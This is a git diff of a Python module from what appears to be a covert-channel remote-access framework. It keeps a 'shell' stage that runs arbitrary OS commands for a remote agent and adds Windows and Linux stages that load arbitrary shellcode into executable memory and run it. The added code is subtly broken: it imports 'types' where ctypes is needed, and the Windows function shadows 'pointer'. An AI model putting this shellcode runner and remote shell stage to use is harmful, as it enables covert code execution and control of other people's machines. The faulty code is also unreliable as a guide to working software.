@@ -1,17 +1,17 @@
 """
-This module provides the :data:`CommonStages` dict which contains functions properly implemented for use alogn with :class:`covertutils.Handlers.FunctionDictHandler.FunctionDictHandler` and subclasses.
+This module provides the :data:`CommonStages` dict which contains functions properly implemented for use alogn with :class:`covertutils.handlers.FunctionDictHandler` and subclasses.
 
-The :data:`Stages.CommonStages` contents are arranged by feature as follows::
+The :data:`payloads.CommonStages` contents are arranged by feature as follows::
 
     CommonStages['shell']       # Contains another dict with keys every usable instance of the `shell` feature.
     CommonStages['shell']['function']       # Contains the actual pointer to the `shell` function. This function executes its argument directly to the Operating System's shell and returns the Standard Output.
     CommonStages['shell']['marshal']        # Contains a serialized representation of `shell` function using the `python marshal` build-in module.
 
-`marshal` stages are suitable for use with :class:`covertutils.Handlers.StageableHandler.StageableHandler`. They can be remotely deployed to an existing agent and called via a specified `stream`.
+`marshal` stages are suitable for use with :class:`covertutils.handlers.StageableHandler`. They can be remotely deployed to an existing agent and called via a specified `stream`.
 
 .. code:: python
 
-    >>> from covertutils.Stages import CommonStages
+    >>> from covertutils.payloads import CommonStages
     >>>
     >>> CommonStages['shell']['function']("echo 1")
     '1\\n'
@@ -23,6 +23,7 @@ The :data:`Stages.CommonStages` contents are arranged by feature as follows::
 
 import pickle
 import marshal
+from types import *
 
 def __system_shell( message ) :
     from os import popen
@@ -52,6 +53,59 @@ def __system_info( message ) :
     return json.dumps(ret).replace( " ","" )    # to save some bytes
 
 
+
+
+
+def __win_shellcode( payload ) :
+
+	from types import *
+	shellcode = payload
+	sc = c_char_p(shellcode)
+	# Reserves or commits a region of pages in the virtual address space of the calling process.
+	pointer = windll.kernel32.VirtualAlloc(c_int(0),
+									   c_int(len(sc)),
+									   c_int(0x3000),
+									   c_int(0x40))
+	buffer = (c_char * len(sc)).from_buffer(sc)
+
+	# The RtlMoveMemory routine copies the contents of a source memory block to a destination
+	# memory block, and supports overlapping source and destination memory blocks.
+	windll.kernel32.RtlMoveMemory(c_int(pointer),
+								  buffer,
+								  c_int(len(sc)))
+	# Creates a thread to execute within the virtual address space of the calling process.
+	ht = windll.kernel32.CreateThread(c_int(0),
+									  c_int(0),
+									  c_int(pointer),
+									  c_int(0),
+									  c_int(0),
+									  pointer(c_int(0)))
+	# Waits until the specified object is in the signaled state or the time-out interval elapses.
+	windll.kernel32.WaitForSingleObject(c_int(ht), c_int(-1))
+
+
+
+def __lin_shellcode( payload ) :
+
+	from types import *
+	from multiprocessing import Process
+	libc = CDLL('libc.so.6')
+	shellcode = payload
+
+	sc = c_char_p(shellcode)
+	size = len(shellcode)
+	addr = c_void_p(libc.valloc(size))
+	memmove(addr, sc, size)
+	libc.mprotect(addr, size, 0x7)
+	run = cast(addr, CFUNCTYPE(c_void_p))
+
+	p = Process(target=run)				# run the shellcode as independent process
+	p.start()
+
+
+
+
+
 def __system_info_handler( message ) :
     pass
 
@@ -69,7 +123,10 @@ CommonStages['sysinfo']['marshal'] = marshal.dumps( __system_info.func_code )
 
 WindowsStages = {}
 WindowsStages['shellcode'] = {}
-
+WindowsStages['shellcode']['function'] = __win_shellcode
+# WindowsStages['shellcode']['marshal'] = marshal.dumps( __win_shellcode )
 
 LinuxStages = {}
 LinuxStages['shellcode'] = {}
+LinuxStages['shellcode']['function'] = __lin_shellcode
+# LinuxStages['shellcode']['marshal'] = marshal.dumps( __lin_shellcode )
